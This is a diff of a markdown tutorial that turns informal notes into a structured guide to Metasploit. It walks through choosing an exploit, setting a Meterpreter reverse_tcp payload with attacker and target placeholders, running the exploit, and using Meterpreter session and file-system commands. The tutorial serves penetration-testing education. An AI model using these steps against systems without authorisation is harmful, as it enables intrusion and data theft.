@@ -1,10 +1,14 @@
-Starting metasploit
+# Metasploit and Basic Steps
+
+## Starting Metasploit
+
+To start Metasploit, open a terminal and run:
 
 ```bash
 msfconsole
 ```
 
-if it gives error regarding database then u need to enable PostgreSQL service
+If you encounter a database error, you might need to enable the PostgreSQL service:
 
 ```bash
 service postgresql start 
@@ -12,135 +16,124 @@ service metasploit start
 msfconsole
 ```
 
-# Basic Steps:
-1. Picking an Exploit
-2. Setting Exploit Options
-3. Picking a Payload
-4. Setting Payload Options
-5. Running the Exploit
-6. Connecting to the Remote System
-7. Performing Post Exploitation Process
+## Basic Steps
 
-## Picking an Exploit
+1. **Picking an Exploit**
 
-```bash
-msf> show exploits
-```
+   To list all available exploits:
 
-This will list all available exploits but we can use `search` command to find the right exploit quicker. 
+   ```bash
+   msf> show exploits
+   ```
 
-```bash 
-msf> help search 
-```
+   You can use the `search` command to find exploits more quickly:
 
-Once we have found the right exploit we need to use this exploit for that purpose we need to run the following command:
+   ```bash
+   msf> help search
+   ```
 
-```bash
-msf> use "name of exploit" #use the expolit
-msf> info "name of exploit" #gives infor regarding the exploit
-```
+   Select an exploit using:
 
-Once you have successfully selected the type of exploit which can target a certain vulnerability in the victims machine now it time to Pick a payload.
+   ```bash
+   msf> use "name of exploit"
+   msf> info "name of exploit"
+   ```
 
-## Picking a Payload
+2. **Setting Exploit Options**
 
-```bash
-msf> show payloads
-```
+   Choose the right exploit and configure its options:
 
-This will list several payloads which can be used against that payload. You can simply select payloads with either `remote_shell` or `meterpreter shell`. The best way is to select the shell type is `reverse tcp shell` as it is not blocked by the firewall.
+   ```bash
+   msf> set RHOSTS target_ip
+   msf> set RPORT target_port
+   ```
 
-```bash
-msf> set payload "name of payload"
-```
+3. **Picking a Payload**
 
-Once the right type of payload is selected now we need to `set payload` options.
+   List available payloads:
 
-```bash
-msf> show options 
-```
+   ```bash
+   msf> show payloads
+   ```
 
-The above command will list all the available options which can be set in that payload.
+   Select a payload, e.g., `reverse_tcp`:
 
-We need to set `LHOST option` to the IP address of attacker machine so that it can make session once the exploit is successful. Once all the option are set we need to check our `set options` for one last time to make sure everything is right. 
-After that we are good to go and type
+   ```bash
+   msf> set payload windows/meterpreter/reverse_tcp
+   ```
 
-```bash
-msf> exploit
-```
+4. **Setting Payload Options**
 
-This will exploit the target machine and once exploit is successful you can have a session with the machine. 
+   Display payload options:
 
-```bash
-msf> sessions
-```
+   ```bash
+   msf> show options
+   ```
 
-This command will show you available sessions in the metasploit framework.
+   Set payload options (e.g., `LHOST`):
 
-Now we can connect to any session by using the session id and running the following command
+   ```bash
+   msf> set LHOST attacker_ip
+   ```
 
-```bash
-msf> sessions -i "Id of the session"
-```
+5. **Running the Exploit**
 
-once we have a session created the `msf` prompt of the terminal will change to `meterpreter` prompt.
+   Run the exploit:
 
-```bash
-meterpreter>
-```
+   ```bash
+   msf> exploit
+   ```
+
+6. **Connecting to the Remote System**
+
+   List available sessions:
+
+   ```bash
+   msf> sessions
+   ```
+
+   Connect to a session:
+
+   ```bash
+   msf> sessions -i session_id
+   ```
+
+   Switch to the Meterpreter prompt:
+
+   ```bash
+   meterpreter>
+   ```
+
+7. **Performing Post Exploitation Process**
+
+   Use various Meterpreter commands for post-exploitation tasks.
 
 # Meterpreter Shell
 
-Meterpreter is a shell created after a successful exploit. It provide set of commands which aid in security testing, as it allows to pull password hashes, gather data and system from the target machine.
+Meterpreter is a powerful shell for post-exploitation tasks.
 
 ## Basic Meterpreter Commands
-The commands are broken down into 7 Sections:
-
-* `Core Commands`
-* `File System Commands`
-* `Networking Commands`
-* `System Commands`
-* `User Interface Commands`
-* `Webcam Commands`
-* `Three priv Commands`
 
 ### Core Commands
 
 ```bash
-#This will background the meterpreter session
-meterpreter> background 
-
-#We can return back to the backgrounded session by using the following command
-meterpreter> sessions -i "session id" 
-
-#Allows to use additional modules
-meterpreter> load
-meterpreter> run
-
-#Exit out of meterpreter
-meterpreter> exit
+meterpreter> background  # Background the session
+meterpreter> sessions -i session_id  # Return to a backgrounded session
+meterpreter> load module_name  # Load additional modules
+meterpreter> run module_name  # Run loaded module
+meterpreter> exit  # Exit Meterpreter
 ```
 
 ### File System Commands
 
 ```bash
-cat       # Read the content of a file
-cd        # Change directory
-download  # download a file or directory
-edit      # edit a file
-getlwd    # print local working directory
-getwd     # print working directory
-lcd       # change local working directory
-lpwd      # print local working directory
-ls        # list files
-mkdir     # make directory
-mv        # move source to destination
-pwd       # print working directory
-rm        # remove file
-rmdir     # remove directory
-search    # search for files
-upload    # upload a file or directory
+meterpreter> cat file_path  # Read file contents
+meterpreter> cd directory_path  # Change directory
+meterpreter> download remote_file local_path  # Download a file
+meterpreter> upload local_file remote_path  # Upload a file
+meterpreter> ls  # List files
+meterpreter> pwd  # Print working directory
+meterpreter> mkdir directory_name  # Create a directory
+meterpreter> rm file_path  # Remove a file
+meterpreter> rmdir directory_path  # Remove a directory
 ```
-
-As we have opened a meterpreter session basically we have access to 2 separate file systems 
-
